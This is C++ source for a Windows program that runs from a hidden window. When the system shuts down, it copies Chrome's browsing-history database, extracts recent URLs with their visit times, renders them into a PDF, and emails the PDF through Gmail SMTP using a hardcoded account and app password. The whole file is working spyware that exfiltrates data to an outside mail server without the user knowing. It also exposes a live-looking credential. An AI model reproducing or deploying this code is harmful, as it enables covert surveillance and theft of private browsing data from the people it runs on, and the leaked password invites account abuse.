#include <windows.h>
#include <sqlite3.h>
#include <fstream>
#include <string>
#include "hpdf.h"
#include <curl/curl.h>

void extract_chrome_history();
void generate_pdf();
void send_email();

std::string getBasePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string p(path);
    return p.substr(0, p.find_last_of("\\/"));
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_ENDSESSION) {
        extract_chrome_history();
        generate_pdf();
        send_email();
        ExitProcess(0);
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}


void extract_chrome_history() {
    char localApp[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localApp, MAX_PATH);

    std::string chromeHistory =
        std::string(localApp) +
        "\\Google\\Chrome\\User Data\\Default\\History";

    std::string base = getBasePath();
    CreateDirectoryA((base + "\\data").c_str(), NULL);

    std::string copyDb = base + "\\history_copy.db";
    CopyFileA(chromeHistory.c_str(), copyDb.c_str(), FALSE);

    sqlite3* db = nullptr;
    if (sqlite3_open(copyDb.c_str(), &db) != SQLITE_OK) return;

    std::ofstream out(base + "\\data\\history.txt");

    const char* sql =
        "SELECT url, datetime(last_visit_time/1000000-11644473600,'unixepoch') "
        "FROM urls ORDER BY last_visit_time DESC LIMIT 20;";

    sqlite3_stmt* stmt;
    sqlite3_prepare_v2(db, sql, -1, &stmt, NULL);

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        out << sqlite3_column_text(stmt, 0)
            << " | "
            << sqlite3_column_text(stmt, 1)
            << "\n";
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    out.close();
}

void generate_pdf() {
    std::string base = getBasePath();
    std::ifstream in(base + "\\data\\history.txt");
    if (!in.is_open()) return;

    HPDF_Doc pdf = HPDF_New(NULL, NULL);
    if (!pdf) return;

    HPDF_Page page = HPDF_AddPage(pdf);
    HPDF_Page_SetFontAndSize(
        page,
        HPDF_GetFont(pdf, "Helvetica", NULL),
        9
    );

    float y = HPDF_Page_GetHeight(page) - 40;
    std::string line;

    while (std::getline(in, line)) {
        HPDF_Page_BeginText(page);
        HPDF_Page_TextOut(page, 40, y, line.c_str());
        HPDF_Page_EndText(page);
        y -= 12;

        if (y < 40) {
            page = HPDF_AddPage(pdf);
            HPDF_Page_SetFontAndSize(
                page,
                HPDF_GetFont(pdf, "Helvetica", NULL),
                9
            );
            y = HPDF_Page_GetHeight(page) - 40;
        }
    }

    HPDF_SaveToFile(pdf, (base + "\\data\\history.pdf").c_str());
    HPDF_Free(pdf);
}

void send_email() {
    CURL* curl = curl_easy_init();
    if (!curl) return;

    struct curl_slist* recipients = NULL;


    curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

    curl_easy_setopt(curl, CURLOPT_USERNAME, "ambavkaruday@gmail.com");
    curl_easy_setopt(curl, CURLOPT_PASSWORD, "ogit rncn mzlf zxnj");

    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "<ambavkaruday@gmail.com>");
    recipients = curl_slist_append(recipients, "<ambavkaruday@gmail.com>");
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    
    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part;

    part = curl_mime_addpart(mime);
    curl_mime_data(
        part,
        "Browser history report attached.",
        CURL_ZERO_TERMINATED
    );

    std::string pdfPath = getBasePath() + "\\data\\history.pdf";
    part = curl_mime_addpart(mime);
    curl_mime_filedata(part, pdfPath.c_str());
    curl_mime_filename(part, "history.pdf");
    curl_mime_type(part, "application/pdf");

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    
    curl_easy_perform(curl);

    
    curl_slist_free_all(recipients);
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
}


int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = "ObzenHiddenWindow";

    RegisterClass(&wc);

    CreateWindowEx(
        0,
        "ObzenHiddenWindow",
        "",
        0,
        0, 0, 0, 0,
        NULL,
        NULL,
        hInst,
        NULL
    );

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        DispatchMessage(&msg);
    }

    return 0;
}




